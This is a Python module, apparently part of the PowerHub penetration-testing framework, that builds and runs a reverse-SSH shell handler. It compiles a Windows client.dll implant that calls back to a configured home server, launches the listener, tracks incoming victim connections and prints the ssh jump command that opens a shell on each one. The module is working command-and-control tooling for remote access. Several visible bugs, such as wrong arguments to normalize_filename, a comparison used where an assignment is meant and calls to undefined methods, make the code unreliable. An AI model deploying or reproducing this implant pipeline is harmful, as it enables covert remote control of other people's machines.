from collections import namedtuple
import logging
from enum import Enum, auto
try:
    from inspect import getfullargspec
except ImportError:
    from inspect import getargspec as getfullargspec
import os
import re
import shutil
import subprocess
import tempfile
import threading

from powerhub.directories import directories

log = logging.getLogger(__name__)

RSSH_EXT_DIR = os.path.join(directories.BASE_DIR, 'ext', 'reverse_ssh')


class HandlerState(Enum):
    OFFLINE = auto()
    BUILDING = auto()
    ONLINE = auto()


BuildCommand = namedtuple(
    "BuildCommand", "cmd env comment post target"
)

REGEX_INCOMING = (
    r".*\[(?P<src>[^]]*)\] INFO .* : "
    r"New controllable connection with id (?P<id>[a-f0-9]{40})$"
)

REGEX_DISCONNECTED = (
    r".*\[(?P<src>[^]]*)\] INFO .* : "
    r"Failed to send keepalive, assuming client has disconnected$"
)


class ShellHandler(object):
    def __init__(self, host, port, notify_incoming):
        self.host = host
        self.port = port
        assert len(getfullargspec(notify_incoming).args) == 1
        self.notify_incoming = notify_incoming
        self.shells = {}
        self.key_path = os.path.join(directories.RSSH_DIR, "controller_key")

        self._state = HandlerState.OFFLINE
        self._thread = None
        self._proc = None
        self._buffer = ""
        self._build_lock = threading.Lock()

    @property
    def state(self):
        return self._state

    def build(self):
        """Prepare the build process and start it in the background
        """

        log.info("Building rssh binaries...")

        if not self.check_dependencies():
            log.error("Unable to build; missing dependencies")
            return

        home_server = "%s:%d" % (self.host, self.port)
        cmd = [shutil.which('make')]
        env = dict(
            CC=shutil.which('x86_64-w64-mingw32-gcc'),
            GOOS='windows',
            HOME=os.environ.get("HOME", ""),
            RSSH_HOMESERVER=home_server,
            #  RSSH_PROXY=foobar:1080,
        )
        key_path = os.path.join(directories.RSSH_DIR, "controller_key")
        authkeys_path = os.path.join(directories.RSSH_DIR, "authorized_keys")

        def post_server(working_dir):
            shutil.copyfile(
                os.path.join(working_dir, "bin", 'server'),
                os.path.join(directories.RSSH_DIR, 'server'),
            )
            os.chmod(os.path.join(directories.RSSH_DIR, 'server'), 0o700)

        def post_client(working_dir):
            # Copy the client dll
            shutil.copyfile(
                os.path.join(working_dir, "bin", "client.dll"),
                self.normalize_filename("client.dll"),
            )

            # Append key to authorized_controllee_keys
            client_pubkey_path = os.path.join(
                working_dir,
                "internal",
                "client",
                "keys",
                "private_key.pub",
            )
            key = open(client_pubkey_path, 'r').read()
            authkeys_path = os.path.join(directories.RSSH_DIR,
                                         "authorized_controllee_keys")
            with open(authkeys_path, 'a+') as fp:
                fp.write(key)

        def post_keygen(working_dir):
            """Append public key to authorized_keys"""
            key = open(key_path + ".pub", 'r').read()
            with open(authkeys_path, 'a+') as fp:
                fp.write(key)

        commands = [
            BuildCommand(
                cmd="ssh-keygen -t ed25519 -f".split() + [key_path, '-N', '', '-C', ''],
                target=key_path,
                env={},
                comment="Generating RSSH controller keys...",
                post=post_keygen,
            ),
            BuildCommand(
                cmd=cmd + ['server'],
                target=os.path.join(directories.RSSH_DIR, 'server'),
                env={**env, 'GOOS': 'linux'},
                comment="Building RSSH server...",
                post=post_server,
            ),
            BuildCommand(
                cmd=cmd + ['client_dll'],
                target=self.normalize_filename(host, port, "client.dll"),
                env=env,
                comment="Building RSSH client.dll...",
                post=post_client,
            ),
        ]

        thread = threading.Thread(
            target=self._build_wrapper,
            args=(commands, ),
        )
        thread.start()

    def _build_wrapper(self, commands):
        """Wrapper for the build function

        This function ensures clean up.
        """
        self._state = HandlerState.BUILDING

        try:
            with tempfile.TemporaryDirectory(
                prefix="powerhub_rssh_",
            ) as tmpdir:
                self._build(tmpdir, commands)
        except Exception:
            self._state = HandlerState.OFFLINE
            log.error("Build failed", exc_info=True)
            return

        self._state = HandlerState.OFFLINE
        log.info("Finished building rssh binaries successfully")

    def _build(self, tmpdir, commands):
        """Actually build the binaries

        The repo is copied to a temporary directory to have guaranteed write
        permissions. The build products are then copied to XDG_DATA_HOME.
        """

        working_dir = os.path.join(os.path.join(tmpdir, "reverse_ssh"))
        shutil.copytree(RSSH_EXT_DIR, working_dir)

        for c in commands:
            if os.path.exists(c.target):
                continue

            p = subprocess.Popen(
                c.cmd,
                env=c.env,
                cwd=working_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                encoding='utf-8',
            )
            log.info(c.comment)
            log.debug("Running: " + " ".join(c.cmd))
            stdout, stderr = p.communicate()

            if p.returncode:
                raise RuntimeError("Build failed: %s" % stderr)

            c.post(working_dir)

    def normalize_filename(self, name):
        if name == 'client.dll':
            result = os.path.join(directories.RSSH_DIR, '%s-%d-%s' %
                                  (self.host, self.port, name))
        else:
            result = os.path.join(directories.RSSH_DIR, name)
        return result

    def check_dependencies(self):
        """Check whether the necessary dependencies are available"""
        dependencies = [
            'make',
            'go',
            'ssh',
            'ssh-keygen',
            'x86_64-w64-mingw32-gcc',
        ]

        result = True

        for dep in dependencies:
            if not shutil.which(dep):
                result = False
                log.error("Dependency not found: %s" % dep)

        return result

    def is_ready(self):
        """Check whether the binaries have been built"""
        # TODO replace this with a make-like logic
        result = all(
            os.path.exists(os.path.join(directories.RSSH_DIR, path))
            for path in [
                'server',
                'controller_key',
                'authorized_controllee_keys',
                'id_ed25519',
            ]
        ) and os.path.exists(self.normalize_filename('client.dll'))
        return result

    def run(self):
        if self.state == HandlerState.ONLINE:
            log.info("Handler already running")
            return

        if not self.is_ready():
            raise RuntimeError("Binaries not built yet")

        cmd = [
            os.path.join(directories.RSSH_DIR, 'server'),
            "%s:%d" % (self.host, self.port),
        ]

        def process_output(self, proc):
            log.debug("Executing: " + " ".join(cmd))
            for line in proc.stderr:
                self._buffer += line
                self.proccess_rssh_line(line[20:])

            self._state == HandlerState.OFFLINE

            if proc.returncode:
                log.error(
                    "RSSH Server exited with non-zero return code: "
                    + line
                )
            else:
                log.info("RSSH Server exited")

        self._proc = subprocess.Popen(
            cmd,
            cwd=directories.RSSH_DIR,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding='utf-8',
        )
        self._thread = threading.Thread(
            target=process_output,
            args=(self, self._proc,),
        )
        log.info("Launching RSSH server")
        self._thread.start()

        self._state = HandlerState.ONLINE

    def proccess_rssh_line(self, line):
        line = line.strip()
        log.debug(line)

        if line.startswith("Failed to handshake "):
            log.error("Reverse SSH: " + line)

        m = re.match(REGEX_INCOMING, line)
        if m:
            d = m.groupdict()
            log.info("Incoming RSSH connection: %s" % d['id'])
            self.report_incoming(d['src'], d['id'])

        m = re.match(REGEX_DISCONNECTED, line)
        if m:
            d = m.groupdict()
            log.info("RSSH disconnected: %s" % d['src'])
            self.report_disconnected(d['src'])

    def stop(self):
        if self.state != HandlerState.ONLINE:
            log.info("Handler not running")
            return

        if self._proc:
            self._proc.terminate()
            self._proc = None
            self._state = HandlerState.OFFLINE

    def get_client_dll(self):
        if self.state != HandlerState.ONLINE:
            log.error("RSSH Handler is not ready")
            return

        path = self.normalize_filename("client.dll")
        result = open(path, 'rb').read()
        return result

    def request_client_dll(self):
        """Start server if necessary and return the client_dll or an error code

        This is handled here to avoid race conditions, because the build
        process is run in a separate thread.
        """

        try:
            self._build_lock.acquire()

            if self.state == HandlerState.ONLINE:
                response = self.get_client_dll()
            elif self.state == HandlerState.BUILDING:
                response = b"still_building"
            # State is OFFLINE
            elif self.is_ready():
                # Binaries built but not running yet
                self.run()
                response = self.get_client_dll()
            else:
                self.build()
                response = b"now_building"

            self._build_lock.release()
            return response
        finally:
            if self._build_lock.locked():
                self._build_lock.release()


class ReverseShell(object):
    def __init__(self, handler, src, id_):
        self.handler = handler
        self.src = src
        self.id_ = id_

    def command(self):
        cmd = "ssh -i %s -J %s:%d %s" % (
            self.handler.key_path,
            self.handler.host,
            self.handler.port,
            self.id_,
        )
        return cmd
